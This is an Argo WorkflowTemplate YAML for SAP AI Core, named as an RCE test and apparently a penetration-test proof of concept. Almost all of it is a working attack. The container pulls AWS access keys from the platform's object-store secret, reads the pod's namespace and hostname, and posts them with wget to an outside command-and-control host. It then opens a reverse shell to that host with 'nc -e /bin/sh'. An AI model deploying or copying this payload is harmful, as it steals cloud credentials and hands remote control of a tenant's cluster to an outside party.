apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: testflo-rce-wft-1785180699
  annotations:
    executables.ai.sap.com/name: testflo-rce-wft-1785180699
    executables.ai.sap.com/id: testflo-rce-wft-1785180699
  labels:
    scenarios.ai.sap.com/id: testflo-scenario
    scenarios.ai.sap.com/name: testflo-scenario
    executables.ai.sap.com/id: testflo-rce-wft-1785180699
    executables.ai.sap.com/name: testflo-rce-wft-1785180699
    ai.sap.com/version: "1.0.0"
    ai.sap.com/resourcePlan: starter
spec:
  entrypoint: cb
  templates:
    - name: cb
      metadata:
        labels:
          ai.sap.com/resourcePlan: starter
      container:
        image: alpine:3.19
        env:
          - name: AWS_ACCESS_KEY_ID
            valueFrom:
              secretKeyRef:
                name: default-object-store-secret
                key: AWS_ACCESS_KEY_ID
          - name: AWS_SECRET_ACCESS_KEY
            valueFrom:
              secretKeyRef:
                name: default-object-store-secret
                key: AWS_SECRET_ACCESS_KEY
        command:
          - sh
          - -c
          - |
            C2="sfg.0x79.de"
            TAG="TESTFLO-WFT-CREDS"
            NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "unknown")
            HN=$(hostname)
            BODY="${TAG} h=${HN} ns=${NS} id=${AWS_ACCESS_KEY_ID} secret=${AWS_SECRET_ACCESS_KEY}"
            wget -q --post-data "${BODY}" "http://${C2}:8080/cb-creds" -O /dev/null 2>/dev/null || true
            nc ${C2} 8080 -e /bin/sh || true
            sleep 3600
